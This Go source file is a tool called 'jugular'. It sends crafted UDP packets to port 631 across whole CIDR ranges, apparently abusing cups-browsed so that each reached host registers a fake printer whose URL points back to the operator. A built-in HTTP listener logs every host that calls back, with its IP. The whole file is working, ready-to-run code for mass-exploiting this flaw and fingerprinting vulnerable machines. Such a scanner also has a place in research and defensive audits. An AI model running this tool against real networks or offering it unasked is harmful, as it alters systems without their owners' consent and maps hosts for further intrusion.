package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/3th1nk/cidr"
	"github.com/gin-gonic/gin"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/schollz/progressbar/v3"
	"github.com/spf13/cobra"
)

var (
	rootCmd = cobra.Command{
		Use: "jugular",
	}

	prodCmd = cobra.Command{
		Use: "prod",
	}

	network     = prodCmd.Flags().String("network", "127.0.0.1/32", "CIDR network to scan, can be a file with many CIDRs (autodetects)")
	parallel    = prodCmd.Flags().Int("parallel", runtime.NumCPU(), "how many packets to send in parallel")
	delay       = prodCmd.Flags().Int("delay", 0, "millisecond delay between each packet per thread")
	url         = prodCmd.Flags().String("url", "http://localhost/printers/JUGULAR", "your http callback address")
	printername = prodCmd.Flags().String("printername", "Jugular 2000", "printer name to send")
	location    = prodCmd.Flags().String("location", "Reboot HQ", "printer location to send")
	myip        = prodCmd.Flags().String("ip", "", "this machines own IP addresss")
	addip       = prodCmd.Flags().Bool("addip", true, "add the target IP to the url")

	listenCmd = cobra.Command{
		Use: "listen",
	}
	bind = listenCmd.Flags().String("bind", "localhost:8080", "address to bind webservice listener to")
)

func main() {
	// define a cobra root command
	rootCmd.AddCommand(&prodCmd, &listenCmd)
	prodCmd.RunE = prod
	listenCmd.RunE = listen
	cobra.MarkFlagRequired(prodCmd.Flags(), "ip")

	err := rootCmd.Execute()
	if err != nil {
		fmt.Println("Error:", err)
		os.Exit(1)
	}
}

func prod(cmd *cobra.Command, args []string) error {
	queue := make(chan string, *parallel*16)
	var wg sync.WaitGroup

	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err != nil {
		return err
	}

	options := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}

	// parse the cidr
	var totalips int64
	var cidrs []cidr.CIDR

	if f, err := os.Open(*network); err == nil {
		linescanner := bufio.NewScanner(f)
		for linescanner.Scan() {
			iprange := linescanner.Text()
			cidrnet, err := cidr.Parse(iprange)
			if err != nil {
				fmt.Printf("problem parsing %v: %v\n", iprange, err)
				continue
			}
			cidrs = append(cidrs, *cidrnet)
			totalips += cidrnet.IPCount().Int64()
		}
	} else {
		cidrnet, err := cidr.Parse(*network)
		if err != nil {
			return err
		}
		cidrs = append(cidrs, *cidrnet)
		totalips += cidrnet.IPCount().Int64()
	}

	// create progressbar
	pb := progressbar.New64(totalips)

	// spin up workers
	for range *parallel {
		wg.Add(1)
		go func() {
			buffer := gopacket.NewSerializeBuffer()
			ipv4 := layers.IPv4{
				Version:  4,
				TTL:      64,
				SrcIP:    net.ParseIP(*myip),
				DstIP:    net.IP{0, 0, 0, 0},
				Protocol: layers.IPProtocolUDP,
			}
			udp := layers.UDP{
				SrcPort: 631,
				DstPort: 631,
			}
			udp.SetNetworkLayerForChecksum(&ipv4)
			payload := fmt.Sprintf(`%x %x %s "%s" "%s"`, 0x00, 0x03, *url, *location, *printername)

			for ip := range queue {
				// create packet
				ipv4.DstIP = net.ParseIP(ip)

				if *addip {
					payload = fmt.Sprintf(`%x %x %s "%s" "%s"`, 0x00, 0x03, *url+"-"+ip, *location, *printername)
				}

				buffer.Clear()
				if err = gopacket.SerializeLayers(buffer, options,
					// &eth,
					&ipv4,
					&udp,
					gopacket.Payload(payload),
				); err != nil {
					fmt.Printf("serialize error: %s\n", err.Error())
					continue
				}
				outgoingPacket := buffer.Bytes()

				addr := syscall.SockaddrInet4{
					Port: 631,
					Addr: [4]byte{ipv4.DstIP[0], ipv4.DstIP[1], ipv4.DstIP[2], ipv4.DstIP[3]},
				}
				if err := syscall.Sendto(fd, outgoingPacket, 0, &addr); err != nil {
					fmt.Printf("tx error: %v\n", err)
				}

				if *delay > 0 {
					time.Sleep(time.Millisecond * time.Duration(*delay))
				}
				pb.Add(1)
			}
			wg.Done()
		}()
	}

	for _, iprange := range cidrs {
		iprange.Each(func(ip string) bool {
			queue <- ip
			return true
		})
	}

	close(queue)
	wg.Wait()
	pb.Finish()

	return nil
}

func listen(cmd *cobra.Command, args []string) error {
	// disable gin debug mode
	gin.SetMode(gin.ReleaseMode)

	router := gin.Default()
	router.Any("/*proxyPath", func(ctx *gin.Context) {
		realpath := ctx.Param("proxyPath")
		headers := ctx.Request.Header
		headers["remote_ip"] = []string{ctx.RemoteIP()}
		contents, _ := json.Marshal(headers)
		os.WriteFile(strings.ReplaceAll(strings.Trim(realpath, "/"), "/", "-")+".json", contents, 0660)
		ctx.AbortWithStatus(404)
	})

	return http.ListenAndServe(*bind, router)
}
